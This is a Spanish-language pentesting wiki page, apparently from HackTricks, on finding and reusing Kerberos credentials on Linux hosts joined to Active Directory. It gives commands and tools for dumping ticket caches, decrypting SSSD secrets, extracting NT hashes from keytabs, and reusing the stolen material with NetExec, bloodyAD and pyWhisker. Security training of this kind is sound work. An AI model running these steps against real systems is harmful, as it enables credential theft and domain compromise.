# Linux en Active Directory

{{#include ../../banners/hacktricks-training.md}}

Una máquina Linux también puede estar dentro de un entorno de Active Directory.

Una máquina Linux dentro de un AD puede **almacenar material de Kerberos localmente**: ccaches de usuario, keytabs de máquina/servicio y secretos gestionados por SSSD. Estos artefactos normalmente se pueden reutilizar como cualquier otra credencial de Kerberos. Para leer la mayoría de ellos, necesitarás ser el usuario propietario del ticket o **root** en la máquina.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Enumeración

### Enumeración de AD desde Linux

Si tienes acceso a un AD desde Linux (o a bash en Windows), puedes probar [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) para enumerar el AD.

También puedes consultar la siguiente página para aprender **otras formas de enumerar AD desde Linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA es una **alternativa** de código abierto a **Active Directory** de Microsoft Windows, principalmente para entornos **Unix**. Combina un **directorio LDAP** completo con un Centro de distribución de claves **Kerberos** de MIT para una gestión similar a la de Active Directory. Al utilizar el **Certificate System** de Dogtag para la gestión de certificados de CA y RA, admite la autenticación **multifactor**, incluidas las smartcards. SSSD está integrado para los procesos de autenticación de Unix.<sup>[[14]](#references)[[15]](#references)</sup> Obtén más información al respecto en:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefactos de hosts unidos al dominio

Antes de manipular tickets, identifica **cómo se unió el host a AD** y **dónde se almacena realmente el material de Kerberos**. En los hosts Linux modernos, esto suele gestionarse mediante `realmd` + `adcli` + `sssd`, no solo con archivos simples en `/tmp`.<sup>[[10]](#references)</sup>

```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```

Esto te indica rápidamente si el host confía en AD, si SSSD está almacenando en caché identidades o tickets, y si hay **keytabs de máquina/servicio** o **secretos de KCM** disponibles para abusar de ellos.<sup>[[4]](#references)[[10]](#references)</sup>

Trata `/var/lib/sss/db/cache_*.ldb` por separado de las ccaches de Kerberos y de `/var/lib/sss/secrets/secrets.ldb`. Los archivos `cache_*.ldb` pueden contener verificadores de contraseñas sin conexión cuando un dominio tiene `cache_credentials = true` **y** el usuario se autenticó previamente en ese host. Normalmente, solo se pueden leer con acceso privilegiado. Un archivo de caché o una opción habilitada, por sí solos, no demuestran que haya una contraseña válida y vigente; revisa la configuración efectiva por dominio y las identidades realmente almacenadas en caché antes de llegar a esa conclusión. Consulta la [documentación de Red Hat sobre la caché de credenciales de SSSD](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/epub/configuring_authentication_and_authorization_in_rhel/overview-single-sign-on_introduction-to-system-authentication). Para una frontera de identidad independiente entre Linux y AD, la [asignación de nombres de Kerberos entre distintos proveedores](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/) solo importa cuando un servicio acepta el ticket y asigna su principal a la cuenta Unix correspondiente.

En un host con `ksu`, un principal de Kerberos válido puede acceder a una **cuenta local de destino**, incluida root, solo cuando esa cuenta autoriza al principal. [MIT Kerberos documenta](https://web.mit.edu/Kerberos/www/krb5-latest/doc/user/user_commands/ksu.html) los archivos `.k5login` y `.k5users` del directorio home de destino, así como la alternativa de asignación de nombres cuando ninguno de ellos existe. `.k5users` también puede restringir los comandos para `ksu -e`; la existencia de un archivo no demuestra por sí sola que se pueda acceder a un shell. Inspecciona la cuenta de destino exacta, la propiedad y los permisos de los archivos, las entradas de autorización legibles, las credenciales de Kerberos disponibles y las reglas de asignación efectivas. Si no se puede acceder al directorio home de root, el estado de autorización es desconocido. La enumeración pasiva debe listar estas rutas y permisos sin solicitar tickets ni ejecutar `ksu`.

Una copia de seguridad programada puede crear indirectamente una frontera de autorización mediante `.k5login`. Si una cuenta con más privilegios copia recursivamente en su propio directorio home un directorio en el que un usuario con menos privilegios puede escribir, verifica que la copia incluya los archivos ocultos, que la ruta de destino sea el directorio home efectivo de la cuenta y que el archivo resultante tenga una propiedad aceptada por el servicio de inicio de sesión de Kerberos. Por ejemplo, [rsync documenta](https://download.samba.org/pub/rsync/rsync.1.html) que `-a --no-owner` deja los archivos nuevos de destino bajo la propiedad del usuario receptor. [MIT Kerberos documenta](https://web.mit.edu/kerberos/www/krb5-latest/doc/user/user_config/k5login.html) cómo un principal en el archivo `.k5login` de ese usuario puede autorizar el acceso. Confirma la identidad RunAs del trabajo programado, el acceso de escritura al origen, las opciones efectivas de rsync, el inicio de sesión con GSSAPI habilitado y un ticket válido para el principal indicado; un directorio de origen con permisos de escritura o un comando rsync programado, por sí solos, no demuestran que la ruta sea viable.

Un keytab legible también requiere una revisión específica del principal. Que un keytab contenga un principal con nombre de administración no demuestra por sí solo que tenga privilegios administrativos: la [política `kadm5.acl` del KDC](https://web.mit.edu/Kerberos/www/krb5-1.22/doc/admin/conf_files/kadm5_acl.html) controla las operaciones permitidas para cada principal. Confirma el principal, la ACL efectiva y la autorización local de `ksu` o del inicio de sesión por separado antes de considerar el acceso al keytab una vía para obtener root. La evaluación pasiva puede listar la ruta y los permisos del keytab sin usar sus claves ni contactar al KDC.

## Uso de tickets

### Pass The Ticket

En esta página encontrarás distintos lugares donde podrías **encontrar tickets de kerberos dentro de un host Linux**. En la siguiente página puedes aprender a transformar estos formatos de tickets CCache a Kirbi (el formato que necesitas usar en Windows) y también a realizar un ataque PTT:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Si quieres consultar los **flujos de trabajo específicos de Linux para recolectar tickets** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, etc.), revisa la página dedicada:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Reutilización de tickets CCACHE desde /tmp

Los archivos CCACHE son formatos binarios para **almacenar credenciales de Kerberos**. `FILE:/tmp/krb5cc_%{uid}` sigue siendo común, pero las implementaciones modernas de Linux también usan `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` o `KCM:%{uid}`. Comprueba la variable de entorno **`KRB5CCNAME`** y la configuración `default_ccache_name` antes de asumir que los tickets están en `/tmp`.<sup>[[1]](#references)[[3]](#references)</sup>

```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```

### Reutilización de tickets CCACHE desde keyring

**Los tickets de Kerberos almacenados en la memoria de un proceso se pueden extraer**, especialmente cuando la protección ptrace de la máquina está deshabilitada (`/proc/sys/kernel/yama/ptrace_scope`). Una herramienta útil para este propósito está disponible en [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), que facilita la extracción mediante la inyección en sesiones y el volcado de tickets en `/tmp`.<sup>[[1]](#references)[[16]](#references)</sup>

Para configurar y usar esta herramienta, se siguen los pasos siguientes:

```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```

Este procedimiento intentará inyectarse en varias sesiones. Indicará que tuvo éxito al guardar los tickets extraídos en `/tmp` con la convención de nombres `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Reutilización de tickets CCACHE desde SSSD KCM

SSSD mantiene una copia de la base de datos en la ruta `/var/lib/sss/secrets/secrets.ldb`. La clave correspondiente se almacena en un archivo oculto en la ruta `/var/lib/sss/secrets/.secrets.mkey`. De forma predeterminada, la clave solo se puede leer si tienes permisos de **root**.<sup>[[4]](#references)</sup>

Al invocar **`SSSDKCMExtractor`** con los parámetros --database y --key, se analizará la base de datos y se **descifrarán los secretos**.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

El extractor imprime payloads JSON de Kerberos sin procesar; conviértelos en una caché de tickets utilizable o en otro formato de ticket antes de realizar operaciones pass-the-cache/pass-the-ticket.<sup>[[4]](#references)</sup>

### Triaje rápido de keytab

```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```

### Extraer cuentas de /etc/krb5.keytab

Las claves de las cuentas de servicio, esenciales para los servicios que se ejecutan con privilegios de root, se almacenan de forma segura en archivos **`/etc/krb5.keytab`**. Estas claves, similares a las contraseñas de los servicios, requieren una estricta confidencialidad.<sup>[[5]](#references)</sup>

Para inspeccionar el contenido del archivo keytab, se puede usar **`klist`**. En Linux, `klist -k -K -e` muestra los principals, los números de versión de las claves, los tipos de cifrado y el material de clave sin procesar. Si el tipo de clave es **23 / RC4-HMAC**, su valor también es el **hash NT** de ese principal.<sup>[[6]](#references)[[17]](#references)</sup>

```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```

Para usuarios de Linux, **`KeyTabExtract`** ofrece funciones para extraer el hash RC4 HMAC, que puede aprovecharse para reutilizar hashes NTLM. Ten en cuenta que esto solo sirve cuando el keytab aún contiene material **etype 23 / RC4-HMAC**. En entornos **solo AES**, quizá no obtengas un hash NT reutilizable, pero aún puedes autenticarte directamente con el keytab mediante Kerberos.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```

En macOS, **`bifrost`** sirve como herramienta para analizar archivos keytab.<sup>[[8]](#references)</sup>

```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```

Utilizando la información extraída de cuentas y hashes, se pueden establecer conexiones con servidores mediante herramientas como **`NetExec`**.<sup>[[9]](#references)</sup>

```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```

### Reutilizar la cuenta de máquina de `/etc/krb5.keytab`

En los sistemas unidos mediante `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` suele contener la **cuenta del equipo** y uno o varios **principals de host/servicio**. Si tienes **root**, no te limites a volcarlo: usa uno de los principals que muestra `klist -k` para solicitar un TGT y operar como el propio host Linux.<sup>[[10]](#references)</sup>

```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```

Esto es especialmente útil cuando el **objeto de equipo** en sí tiene derechos delegados en AD o cuando se permite que el host recupere otros secretos, como un **gMSA**.<sup>[[13]](#references)</sup>

### Reutilizar material Kerberos robado con herramientas de AD orientadas a Linux

Una vez que tengas un `ccache` válido o un keytab utilizable, puedes operar contra AD **directamente desde Linux** sin convertir primero todo a formatos de Windows. Muchas herramientas modernas aceptan `KRB5CCNAME` / autenticación Kerberos de forma nativa.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>

```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
  --target 'WEB01$' --action list
```

Esta es una buena conexión entre **Linux post-exploitation** y el **abuso de objetos de AD**. Para conocer las propias rutas de abuso a nivel de objeto, consulta:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Artefactos de Linux gMSA / Managed Service Account

Las implementaciones recientes de Linux pueden usar **Managed Service Accounts** directamente desde AD. En la práctica, esto significa que, tras comprometer un servidor Linux, puedes encontrar no solo el keytab del host, sino también **keytabs específicos del servicio** generados a partir de un gMSA. Algunos lugares habituales que conviene inspeccionar son `/etc/gmsad.conf`, los archivos de configuración específicos de cada implementación y otros archivos `*.keytab` bajo `/etc`.<sup>[[2]](#references)[[13]](#references)</sup>

```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```

Esto te proporciona una identidad Kerberos reutilizable para los SPN vinculados a esa gMSA **sin tocar ningún endpoint de Windows**.<sup>[[13]](#references)</sup> Para abusar de gMSA/dMSA **desde el lado del dominio** después de obtener privilegios más altos en AD, consulta:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): ¿Cómo atacar Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Acceso a AD con una cuenta de servicio administrada – Integración directa de sistemas RHEL con Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Variables de entorno de Kerberos – Documentación de MIT Kerberos](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – Documentación de MIT Kerberos](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: Tipos de cifrado RC4-HMAC de Kerberos utilizados por Microsoft Windows](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Uso de Kerberos | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Descubrir y unir dominios de identidad | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [Guía del usuario de bloodyAD](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [Acerca de | Documentación de FreeIPA](https://www.freeipa.org/About.html)
- [15] [Notas de la versión de FreeIPA 4.11.0](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – Documentación del kernel de Linux](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – Documentación de MIT Kerberos](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
